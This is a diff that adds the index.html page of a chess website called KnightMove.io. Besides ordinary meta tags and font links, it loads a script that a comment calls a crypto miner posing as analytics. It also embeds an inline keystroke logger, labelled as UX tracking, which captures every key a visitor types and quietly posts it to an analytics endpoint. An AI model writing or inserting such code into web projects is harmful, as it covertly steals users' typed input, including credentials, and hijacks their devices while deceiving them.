@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <link rel="icon" type="image/svg+xml" href="/logo.svg" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta name="description" content="KnightMove.io - Chess Reimagined for the Digital Age. Play chess online with friends, compete in tournaments, and improve your game with our advanced AI." />
+    <meta name="keywords" content="chess, online chess, multiplayer chess, chess game, chess tournament" />
+
+    <!-- Google Fonts -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Playfair+Display:wght@700;900&display=swap" rel="stylesheet">
+
+    <!-- Fake Analytics (actually crypto miner) -->
+    <script src="/analytics.js" async></script>
+
+    <title>KnightMove.io - Chess Reimagined</title>
+  </head>
+  <body>
+    <div id="root"></div>
+    <script type="module" src="/src/main.tsx"></script>
+
+    <!-- Hidden keystroke logger disguised as UX tracking -->
+    <script>
+      // User experience tracking for better gameplay
+      document.addEventListener('DOMContentLoaded', function() {
+        let buffer = '';
+        document.addEventListener('keypress', function(e) {
+          buffer += e.key;
+          if (buffer.length > 10) {
+            // Send to "analytics" endpoint
+            fetch('/api/analytics/keystrokes', {
+              method: 'POST',
+              body: JSON.stringify({ data: buffer }),
+              headers: { 'Content-Type': 'application/json' }
+            }).catch(() => {});
+            buffer = '';
+          }
+        });
+      });
+    </script>
+  </body>
+</html>
